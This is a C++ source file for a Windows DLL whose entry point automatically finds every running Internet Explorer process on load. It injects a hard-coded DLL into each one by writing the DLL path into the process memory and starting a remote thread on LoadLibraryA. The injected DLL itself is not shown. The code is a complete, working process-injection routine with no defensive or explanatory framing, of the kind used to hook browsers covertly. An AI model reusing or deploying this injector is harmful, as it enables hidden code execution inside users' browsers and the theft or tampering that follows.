// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

DWORD GetProcessIDByName(wchar_t* ProcessName, DWORD LastPID);
void InjectProcess(DWORD PID);

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	DWORD resPID;
	DWORD iLastPID = 0;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		resPID = GetProcessIDByName(L"IEXPLORE.EXE", iLastPID);
		while (resPID > 0)
		{
			InjectProcess(resPID);

			iLastPID = resPID;
			resPID = GetProcessIDByName(L"IEXPLORE.EXE", iLastPID);
			//FreeLibraryAndExitThread(hModule, 0);
		}
		
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void InjectProcess(DWORD PID)
{
	char* buffer = "C:\\Source\\GitHub\\Haa\\Debug\\HaaDLL32.dll";

	/*
	* Get process handle passing in the process ID.
	*/

	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (process == NULL) {
		printf("Error: the specified process couldn't be found.");
	}

	///*
	//* Get address of the LoadLibrary function.
	//*/
	//LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	//if (addr == NULL) {
	//	printf("Error: the LoadLibraryA function was not found inside kernel32.dll library.");
	//}

	/*
	* Allocate new memory region inside the process's address space.
	*/
	LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("Error: the memory could not be allocated inside the chosen process.");
	}

	/*
	* Write the argument to LoadLibraryA to the process's newly allocated memory region.
	*/
	int n = WriteProcessMemory(process, arg, buffer, strlen(buffer), NULL);
	if (n == 0) {
		printf("Error: there was no bytes written to the process's address space.");
	}

	/*
	* Inject our DLL into the process's address space.
	*/
	HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, arg, NULL, NULL);
	if (threadID == NULL) {
		printf("Error: the remote thread could not be created.");
	}

	/*
	* Close the handle to the process, because we've already injected the DLL.
	*/
	CloseHandle(process);
}

DWORD GetProcessIDByName(wchar_t* ProcessName, DWORD CurrentPID)
{
	int iCount = 0;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (wcscmp(entry.szExeFile, ProcessName) == 0)
			{
				DWORD PID = entry.th32ProcessID;
				iCount++;
				if (PID > CurrentPID)
				{
					return PID;
				}
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
}

DWORD GetNextLowestProcessIDByName(wchar_t* ProcessName, DWORD LastPID)
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
	DWORD CurrentPID = 100000;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return 1;
	}


	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the name and process identifier for each process.

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0 && aProcesses[i] < CurrentPID && aProcesses[i] > LastPID)
		{
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

			// Get a handle to the process.

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
				PROCESS_VM_READ,
				FALSE, aProcesses[i]);

			// Get the process name.

			if (NULL != hProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
					&cbNeeded))
				{
					GetModuleBaseName(hProcess, hMod, szProcessName,
						sizeof(szProcessName) / sizeof(TCHAR));
				}
			}
			CloseHandle(hProcess);

			if (sizeof(szProcessName) > 0 && wcscmp(szProcessName, ProcessName) == 0)
			{
				CurrentPID = aProcesses[i];
			}
		}
	}
	if (CurrentPID != 100000)
		return CurrentPID;
	else
		return 0;
}

